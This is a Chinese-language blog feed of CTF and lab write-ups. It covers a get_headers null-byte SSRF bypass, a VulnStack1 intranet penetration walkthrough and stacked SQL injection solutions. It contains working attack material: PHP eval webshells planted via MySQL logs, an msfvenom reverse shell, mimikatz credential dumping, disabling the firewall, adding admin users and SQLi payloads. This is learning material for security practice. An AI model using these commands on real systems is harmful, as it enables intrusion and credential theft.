HTTP 请求所发送的标头</p></li><li><p>在该漏洞中get_headers() 会静默地截断它使用的URL中空字节之后的任何内容。这个在网页里可以结合SSRF使用，可以用来绕过对url尾部的检测，并且访问我们想要访问的地址，得到一些敏感的标头信息，造成信息泄露。</p><blockquote><p>eg：[GKCTF2020]cve版签到</p><p>只允许访问后缀为.ctfhub.com的网页；</p><p><img src="https://i.loli.net/2021/03/11/vUwPecRdzS1B29M.png"><br>这时就可以构造url%00.ctfhub.com绕过检测，从而访问url</p><p><img src="https://i.loli.net/2021/03/11/M6XZCi7JDdArjnI.png" alt="127.0.0.1%00.cth.com"></p><p>再根据提示访问<code>127.0.0.123%00.ctfhub.com</code>即可获取flag</p></blockquote></li></ul><h1 id="一些小知识"><a href="#一些小知识" class="headerlink" title="一些小知识"></a>一些小知识</h1><ul><li>等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的</li><li>在Ua中传入是不会进行解码的，因此编码绕过是无效的<br>而在url中写入则会被url编码，没到达php就会被写入日志文件，同样不行</li></ul><p><img src="https://i.loli.net/2021/03/10/857Yrt69bD2keOP.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack1</title>
      <link href="2021/04/19/VulnStack1/"/>
      <url>2021/04/19/VulnStack1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近有些迷茫，就只是单纯的刷web题和写一下python脚本，渗透方面倒是没啥长进<br>就打算做一下这些靶场，也了解一下内网</p><h1 id="环境安装及配置"><a href="#环境安装及配置" class="headerlink" title="环境安装及配置"></a>环境安装及配置</h1><p><img src="https://i.loli.net/2021/03/18/W37ZjQGTCcnim8P.png"></p><table><thead><tr><th align="center">名称</th><th align="center">ip</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">kali</td><td align="center">192.168.244.129</td><td align="center">攻击机</td></tr><tr><td align="center">win7</td><td align="center">192.168.244.134</td><td align="center">VM1：web服务器</td></tr><tr><td align="center">win2k3</td><td align="center">192.168.52.141</td><td align="center">VM2：域成员</td></tr><tr><td align="center">win2008</td><td align="center">192.168.52.138</td><td align="center">VM3：域控服务器</td></tr></tbody></table><p>用的是VMware，将三个虚拟机的压缩包解压，然后VM扫描虚拟机就快速导入了</p><p>关键是网络的配置：</p><p>攻击机kali网卡设置为：<code>VMnet8(NAT模式)</code></p><p>VM1(Win7)添加一块网卡，分别设置为：<code>VMnet1(仅主机模式)</code>、<code>VMnet8(NAT模式)</code><br>VM2(Win2003)网卡设置为：<code>VMnet1(仅主机模式)</code><br>VM2(Win2008)网卡设置为：<code>VMnet1(仅主机模式)</code><br><img src="https://i.loli.net/2021/03/18/JCS5pvBgq12w3Pr.png"></p><p>开机要求输入密码为：<code>hongrisec@2019</code>，可能提示要修改密码，必须有符合、字母和数字<br>（ps：提示按ctrl+alt+del才能进入登陆框，但这样物理机也会弹出任务管理，因此在vm中按ctrl+alt+ins就可以了）</p><h2 id="系统任务栏图标透明、无法打开"><a href="#系统任务栏图标透明、无法打开" class="headerlink" title="系统任务栏图标透明、无法打开"></a>系统任务栏图标透明、无法打开</h2><p>然后就是打开win7的phpstudy了，但在这里踩坑了，运行时phpstudy由于无法创建任务栏图标崩溃了–<br>搞了一个多钟差点破防，后来用度娘一搜就出来==，是真的难受</p><p><strong>解决办法：</strong></p><ol><li>win+r输入<code>regedit</code>打开注册表</li><li>依次找到<br>HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify</li><li>清空<code>IconStreams</code>和<code>PastIconsStream</code>的值（右键全选、删除|剪切，保存即可）</li><li>重启explorer.exe：打开任务管理器，在进程一栏关闭explorer.exe；然后创建新任务：explorer.exe</li></ol><h2 id="kali安装蚁剑"><a href="#kali安装蚁剑" class="headerlink" title="kali安装蚁剑"></a>kali安装蚁剑</h2><p>因为ip配置的问题，物理机没连局域网，想想还是直接在kali装个蚁剑吧</p><p><a href="https://github.com/AntSwordProject/AntSword-Loader">AntSwordProject/AntSword-Loader: AntSword 加载器 (github.com)</a><br><img src="https://i.loli.net/2021/03/18/pWmcRr9QXUb58DN.png"><br>下载完之后找地方解压，然后进入解压后的目录<br><img src="https://i.loli.net/2021/03/18/1g53vqC8aHDObEG.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 如果没有x权限就给AntSword加个执行权限</span></span><br><span class="line">sudo chmod u+x AntSword</span><br><span class="line"><span class="meta">#</span><span class="bash"> 然后允许AntSword即可，需要一个具有写权限的初始化目录，按自己心情弄吧--</span></span><br><span class="line">sudo mkdir antsword</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行！</span></span><br><span class="line">./AntSword</span><br></pre></td></tr></table></figure><h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>咱们的攻击机kali ip是192.168.244，用nmap扫一下<code>nmap -sn 192.168.244.129/24</code><br><img src="https://i.loli.net/2021/03/18/SgKNX1AsWU6RIYF.png"></p><p>可以看到扫出了win7的外网ip</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>然后就是扫描主机的端口了，仍是nmap：<code>nmap -Pn -A 192.168.244.134</code></p><p>可以看到开放了80和3306端口，想到网站和mysql数据库</p><p><img src="https://i.loli.net/2021/03/18/WQKE1Z4gLvb9Pic.png"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>接下来就是对外网进行渗透了，先访问一下ip，直接就是一个探针<br><img src="https://i.loli.net/2021/03/18/wmLz6QafxJu8KbU.png"><br>先扫下目录吧，看看有啥好东西<br>这里没装脚本，就用一下kali自带的niktp：<code>nikto -h 192.168.244.134</code></p><p><img src="https://i.loli.net/2021/03/18/8B9Qj5ihOTYrKRL.png"><br>可以看到扫到个phpmyadmin，常规密码、弱口令走一波<br>root、root登陆成功</p><p>版本为5.5.53，可惜看到的大部分漏洞都不包含这个版本<br><img src="https://i.loli.net/2021/03/18/cJT5hodMK3QYI8z.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="PHPMyadmin后台getshell技巧"><a href="#PHPMyadmin后台getshell技巧" class="headerlink" title="PHPMyadmin后台getshell技巧"></a>PHPMyadmin后台getshell技巧</h3><h4 id="直接写入"><a href="#直接写入" class="headerlink" title="直接写入"></a>直接写入</h4><p>那么先试试之前学过的select into outfile|dumpfile 直接写shell</p><p>利用条件</p><ul><li>secure_file_priv没有具体值（不是NULL）<br>(NULL:限制mysql导入和导出；无具体值：不做限制；有值：只能在该值指定目录进行导入导出)</li><li>知道路径，具有写权限，可使用单引号<br>（ps：<code>magic_quotes_gpc</code>开启时，会对’单引号进行转义，使其变成“\”反斜杠）</li></ul><p>okk，那么就开始吧，利用<code>@@datadir</code>、<code>@@secure_file_priv</code>来看看这些值如何</p><p><img src="https://i.loli.net/2021/03/18/S5QiwoLa4WX6VG3.png"><br>可惜的是secure_file_priv=NULL，那么此法就不可行了，正好学习其他方法</p><h4 id="利用日志文件getshell"><a href="#利用日志文件getshell" class="headerlink" title="利用日志文件getshell"></a>利用日志文件getshell</h4><p>前提：</p><ul><li>账号拥有<code>可读可写</code>权限</li><li><code>Mysql</code>版本大于<code>5.0</code>，在5.0版本以上mysql会创建日志文件，通过改变全局变量控制日志文件的生成从而getshell</li></ul><h5 id="开启全局日志getshell"><a href="#开启全局日志getshell" class="headerlink" title="开启全局日志getshell"></a>开启全局日志getshell</h5><ul><li><p>步骤：</p><ul><li>查看general_log和general_log_file：<code>show variables like &#39;%general%&#39;;</code></li><li>开启general log模式：<code>set global general_log = on;</code></li><li>设置日志目录为shell写入路径：<code>set global general_log_file = &#39;C:/phpStudy/WWW/hhh.php&#39;;</code></li><li>写入shell：<code>select &#39;&lt;?php eval($_POST[hhh]);?&gt;&#39;</code></li></ul></li></ul><p><u>实操一波</u>：</p><p>ps：同样的这样查也可以(如下general_log就没打开)</p><p><img src="https://i.loli.net/2021/03/18/wTXqm26oaebGBhL.png"><br>那么就按步骤一步步来吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br><span class="line">set global general_log_file &#x3D; &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hhh.php&#39;;</span><br><span class="line">select @@general_log,@@general_log_file,@@datadir;</span><br></pre></td></tr></table></figure><p>okk，全局日志以及路径都设置好了，接下来就是写shell了</p><p>（ps：这里的www路径可以在探针里看，也可以利用@@datadir爆出phpstudy路径，然后根据默认路径找到www）<br><img src="https://i.loli.net/2021/03/18/8x9qDXUIEwoNbVT.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[hhh]);?&gt;&#39;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/qfaN7S8PvFMn5yc.png"></p><p>文件内容如下，就是一个存储命令和状态的日志<br><img src="https://i.loli.net/2021/03/18/KtlRNa18eAsyBc7.png"></p><p>蚁剑连接即可：</p><p><img src="https://i.loli.net/2021/03/18/xRuFK9zbdq4Zs6j.png"></p><h5 id="使用慢查询日志getshell"><a href="#使用慢查询日志getshell" class="headerlink" title="使用慢查询日志getshell"></a>使用慢查询日志getshell</h5><ul><li>慢查询日志：<br>记录所有执行时间超过long_query_time秒的所有查询或者不使用索引的查询。默认情况下，MySQL数据库是不开启慢查询日志的，long_query_time的默认值为10（即10秒，通常设置为1秒），即运行10秒以上的语句是慢查询语句<br>（ps：和全局日志一样都是讲恶意语句写入日志中，只是二者记录的条件不同）</li><li>步骤：<ul><li>查看相关参数：<code>show variables like &#39;%slow%&#39;;</code></li><li>启用慢查询日志，并修改路径：<br><code>set global slow_query_log_file = &#39;C:/phpStudy/WWW/hhh2.php&#39;;</code><br><code>set GLOBAL slow_query_log=on;</code></li><li>写入shell：<code>select &#39;&lt;?php eval($_POST[hhh]);?&gt;&#39; from mysql.db where sleep(10);</code></li></ul></li></ul><p><img src="https://i.loli.net/2021/03/18/57lRmE3kZtqGo8A.png"><br><img src="https://i.loli.net/2021/03/18/jDBZV9ymuG6r37c.png">j</p><p>看一下www目录下还有个yxcms，em看了这里也可以getshell，那么就来看一下吧</p><h3 id="yxcms后台getshell"><a href="#yxcms后台getshell" class="headerlink" title="yxcms后台getshell"></a>yxcms后台getshell</h3><p>搜了一下相关漏洞，后台getshell好像更容易一些<br>后台路径：<code>ip/yxcms/index.php?r=admin</code>,又是弱口令：admin、123456直接登入了，不得不说弱口令yyds<br>（说起来学校也是好多弱口令，当然我没打过啊，只是知道密码–）</p><p>在后台里可以直接 新建 | 修改文件内容，那么直接上马，连接即可</p><p><img src="https://i.loli.net/2021/03/18/N21VQTJFhci98kO.png"></p><p>外网大概就是到这里0。0，内网还在研究，需要学习一下msf和cs的使用</p><h1 id="拿下VM1进入内网"><a href="#拿下VM1进入内网" class="headerlink" title="拿下VM1进入内网"></a>拿下VM1进入内网</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>刚开始学习其实有点纠结于信息收集，其实信息收集按个人习惯就好，达到最终目的就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami# 查看权限；用户为god；权限为administrator，可以上传东东反弹shell~</span><br><span class="line">ipconfig# 看网卡</span><br><span class="line">net config Workstation# 查看当前登录域及登录用户信息</span><br><span class="line">net view &#x2F;domain:god# 查看域成员</span><br></pre></td></tr></table></figure><h2 id="MSF反弹shell"><a href="#MSF反弹shell" class="headerlink" title="MSF反弹shell"></a>MSF反弹shell</h2><p>作为msf的一次练习，学习了<br><a href="https://paper.seebug.org/29/">渗透攻防工具篇-后渗透阶段的Meterpreter (seebug.org)</a><br><a href="https://www.mrwu.red/web/2674.html">msf后渗透利用命令|MrWu</a></p><p>那么先在msf弹一个shell：<br>msf生成一个payload上传到win7并执行，得到msf的session</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这里的IP是攻击机也就是kali的ip，端口则是监听的端口：</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.244.128 LPORT=6666 -f exe -o hhh.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成完毕给他777权限：</span></span><br><span class="line">chmod 777 hhh.exe</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/07/sIcoH1ZxDtWFORq.png" alt="把他上传到win7"></p><p>然后在kali利用msf接收这个反弹shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler     # 进入模块</span><br><span class="line">set payload windows/meterpreter/reverse_tcp     # 设置payload模块</span><br><span class="line">set lhost 192.168.244.128     # 设置kali的地址</span><br><span class="line">set lport 6666        # 设置监听的端口</span><br><span class="line">run# 执行攻击！（run|exploit都可以）</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/07/FmK9x4pGSjhtv2e.png"></p><p>然后在win7执行hhh.exe就可以拿到反弹shell了<br>可以看到拿到了一个meterpreter</p><p><img src="https://i.loli.net/2021/04/07/mDq8K1uaRjpzTFy.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一些msf的命令：</span><br><span class="line">getuid查看用户权限</span><br><span class="line">getsystem提权为管理员</span><br><span class="line">sysinfo查看系统信息</span><br><span class="line">ps查看进程</span><br><span class="line">migrate pid迁移进程至pid号进程</span><br></pre></td></tr></table></figure><p>这里<code>getuid</code>可以看到咱们是god/admin，<br>（当然不是admin可能反弹shell都上传不了–，如果拿到shell需要提权的话msf也有命令可以提权：<code>getsystem</code>）</p><p>然后就是维持权限了，把咱们的反弹shell迁移到系统自身进程上去：<br>先<code>ps</code>查看进程，再迁徙就行（一般可以注入到像是 lsass 或者 explorer 这样的进程当中，相对比较隐蔽，较难排查）<br>执行<code>migrate 504</code>即可<br>可以看到lsass进程pid为504，反弹shell进程为4300，执行后就由4300迁徙到504啦</p><p><img src="https://i.loli.net/2021/04/17/NS8DJQkWrHfLdoC.png" alt="lsass进程pid为504"></p><p><img src="https://i.loli.net/2021/04/17/27WBGoczia1PtO4.png" alt="反弹shell进程为4300"></p><p>然后就是抓取管理员密码了，windows抓取密码的话当然是mimikatz~：<code>load mimikatz</code>运行msf自带的mimikatz模块</p><blockquote><p>mimikatz：<br>1.<code>mimikatz</code>可以直接从 lsass.exe 进程里获取windows处于active状态账号的明文密码</p><p>（lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！）<br>2.<code>mimikatz</code>模块的使用需要Administrator权限或者System权限。MSF中自带mimikatz模块，MSF中的 mimikatz 模块同时支持32位和64位的系统，但是<code>该模块默认是加载32位的系统</code>，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。而且在64位系统下必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载mimikatz并且查看系统明文。但是在32位系统下则没有这个限制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">相关命令可以输入：help mimikatz来查看，如下</span><br><span class="line">(只能显示七个命令，可以通过mimikatz_command输入一条错误指令来显示完整的功能命令</span><br><span class="line">eg：mimikatz_command -f a::)</span><br><span class="line">kerberos：kerberos相关的模块</span><br><span class="line">livessp：尝试检索livessp凭据</span><br><span class="line">mimikatz_command：运行一个定制的命令</span><br><span class="line">msv：msv凭证相关的模块，列出目标主机的用户密码哈希</span><br><span class="line">ssp：ssp凭证相关的模块</span><br><span class="line">tspkg：tspkg凭证相关的模块</span><br><span class="line">wdigest：wdigest凭证相关的模块</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/17/MGgXVyiwhf2xka1.png" alt="完整功能命令"></p><p>这里用到的是<code>sekurlsa</code>下的<code>searchPasswords</code>功能来查看明文密码<br>(ps:这里本身就是<code>NT AUTHORITY\SYSTEM</code>,就不用<code>privilege::debug</code>进行提权了)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><p><del>不过我这拿不到明文，只能得到密文–</del><br>（而且在之前迁移进程的时候必须是和lsass混合才能执行mimikatz）<br>呃我发现问题所在了，这就是mimikatz获得明文的奥秘了，执行之后靶机会注销，这时如果不重启，而是直接输入密码的话，明文密码就会被mimikatz获得了<br><img src="https://i.loli.net/2021/04/18/DhwS9J5APNuQ7b2.png"></p></blockquote><p>当然也可以上传个mimikatz.exe直接整</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload mimikatz.exe路径 靶机路径：如upload root\mimikatz.exe路径 靶机</span><br></pre></td></tr></table></figure><p>然后就可以利用3389端口和获得的管理员帐号来进行远程登录了<br>（思路不限制，主要还是习惯，看一些文章有的师傅是直接新建用户进行远程登录再进行操作提权这些）</p><h2 id="3389端口远程登录"><a href="#3389端口远程登录" class="headerlink" title="3389端口远程登录"></a>3389端口远程登录</h2><p>然后就是看3389端口了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这里可以msf直接看端口，不过之前nmap扫的时候看到3389是没开的</span></span><br><span class="line">netstat -ano |findstr 3389# msf</span><br><span class="line">nmap 192.168.244.134 -p1-65534# nmap</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/N286UrgTs4GOBld.png" alt="可以看到3389端口没有打开"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 打开3389端口，得在shell里操作，msf识别不了这个命令</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"><span class="meta">#</span><span class="bash"> 再看一下端口是否打开成功</span></span><br><span class="line">netstat -ano |findstr 3389</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/aNblPefDBTqS9VO.png"></p><p>不过因为防火墙的原因，还是没能连上，需要把防火墙关一下再进行远程连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 关闭防火墙，还是在shell里执行</span></span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> msf 开启远程桌面</span></span><br><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line"><span class="meta">#</span><span class="bash"> kali terminal 远程连接！00</span></span><br><span class="line">rdesktop 192.168.244.134</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/XgyxeFG98hHskKw.png"><br>这里的账号填写的是<code>域名\域用户名，</code>如<code>God\Administrator</code>,下面几个都可以<br><img src="https://i.loli.net/2021/04/18/DhwS9J5APNuQ7b2.png" alt="这几个都可以"><br>或者是新建用户再提权为管理员权限（也就是拉到admin组里啦）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 同样是在shell里操作</span></span><br><span class="line">net user username password /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure><p>然后就可以直接连接目标主机了</p><h1 id="内网搜集"><a href="#内网搜集" class="headerlink" title="内网搜集"></a>内网搜集</h1><p>也就是拿后面的两台机子，win7是唯一与外网相连接的，现在可以作为跳板对其进行渗透了<br>在此前先是一波信息收集：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> msf：</span></span><br><span class="line">run get_local_subnets# 获取内网网段</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/zctaDyjAsmO9pPn.png"><br>添加路由，再利用VM1发现内网网段下的IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/8yF1Z2RrJC5YzH7.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for /L %i IN (1,1,254) DO ping -w 2 -n 1 192.168.52.%i# 批量ping 192.168.52.%i</span><br><span class="line">arp -a# 利用arp协议解析</span><br></pre></td></tr></table></figure><p>关于命令<code>FOR /L %%parameter IN (start,step,end) DO command</code>:<br><img src="https://i.loli.net/2021/04/18/muFeXKx6Y92kwAT.png"></p><p>然后输入<code>arp -a</code>可以得到如下结果，咱们要的应该是<code>192.168.52.138</code>和<code>192.168.52.141</code></p><p><img src="https://i.loli.net/2021/04/18/ZHAYcvi4xsf7DIa.png"></p><p>作者给出的内网漏洞列表如下：<br><img src="https://i.loli.net/2021/04/18/pHdYtJsfjMAblaB.png"></p><p>呃到这又要断更了，后续再继续整</p>]]></content>
      
      
      <categories>
          
          <category> VulStack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnStack </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随便注|blacklist =&gt; 的一些知识</title>
      <link href="2021/03/09/%E9%9A%8F%E4%BE%BF%E6%B3%A8blacklist%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/"/>
      <url>2021/03/09/%E9%9A%8F%E4%BE%BF%E6%B3%A8blacklist%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近刷题刷到 [强网杯2019]随便注 和 [GYCTF2020]Blacklist；<br>加深了一点对堆叠注入的理解，也了解到一些相关waf的简单bypass<br>算是对之前sqli学习的一些补充吧；后续也要对mysql进行深入的学习才行（毕竟这学期也有这门课程–）</p><h1 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="[强网杯2019]随便注"></a>[强网杯2019]随便注</h1><p><img src="https://i.loli.net/2021/03/09/753fzuyAcqHebMO.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">堆叠注入：</span><br><span class="line">1&#39;; show databases;#&#x2F;&#x2F;库名</span><br><span class="line">1&#39;; show tables;#&#x2F;&#x2F;表名</span><br><span class="line">1&#39;; show columns from &#96;1919810931114514&#96;;# &#x2F;&#x2F;字段；表名为数字时，要用反引号包起来查询。</span><br></pre></td></tr></table></figure><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>预处理</p><p>select被过滤了，所以先将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96; 1919810931114514 &#96;</span><br></pre></td></tr></table></figure><p>进行16进制编码</p><p>再通过构造payload进而得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;1:利用预处理语句会进行编码转换，将sql语句转为十六进制</span><br><span class="line">-1&#39;;</span><br><span class="line">SeT @a &#x3D; 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;</span><br><span class="line">prepare execsql from @a;</span><br><span class="line">execute execsql;</span><br><span class="line"></span><br><span class="line"># set：设置变量名和值</span><br><span class="line"># prepare…from…：预处理语句，会进行编码转换；且prepare用于预备一个语句，并赋予名称，之后可以引用该语句</span><br><span class="line"># execute：执行由SQLPrepare创建的SQL语句</span><br><span class="line"># ps：SELECT 可以在一条语句里对多个变量同时赋值,而 SET 只能一次对一个变量赋值</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2：利用concat()也可以0-0</span><br><span class="line">-1&#39;;</span><br><span class="line">Set @a &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);</span><br><span class="line">prepare execsql from @a;</span><br><span class="line">execute execsql;</span><br></pre></td></tr></table></figure><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>修改表名列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">rename table words to word1;# words 表更名为 word1</span><br><span class="line">rename table  &#96;1919810931114514&#96; to words; # 1919810931114514 更名为 words </span><br><span class="line">alert table words add id int unsigned not Null auto_increment primary key; # 给新 words 表添加新的列名 id</span><br><span class="line">alert table words change flag data varchar(100); ## 将新word中的 flag 改名为 data </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#or：</span><br><span class="line"></span><br><span class="line">1&#39;;</span><br><span class="line">alter table words rename to words1;# words 表更名为 word1</span><br><span class="line">alter table &#96;1919810931114514&#96; rename to words;# 1919810931114514 更名为 words</span><br><span class="line">alter table words change flag id varchar(50);## 将新words 中的 flag 改名为 id</span><br></pre></td></tr></table></figure><p>然后输入<code>1&#39; or 1=1#</code>即可查看flag</p><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>基于随便注改的sql注入；打算联合查询的时候直接爆出了题目说的blacklist黑名单：</p><p><code>(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject)</code></p><p>猜测后端语句为<code>select * from Table where inject = &#39;$inject&#39;;</code></p><p>爆字段数：<code>1&#39; order by 2--+</code></p><p>ban了select；不能直接联合查詢<br>ban了set和prepare；不能預编译<br>ban了alter和rename；不能改表名访问数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39; ;show tables--+&#96;#爆表</span><br><span class="line">?inject&#x3D;1&#39; ;show columns from &#96;FlagHere&#96;--+#爆列</span><br></pre></td></tr></table></figure><h2 id="解法3"><a href="#解法3" class="headerlink" 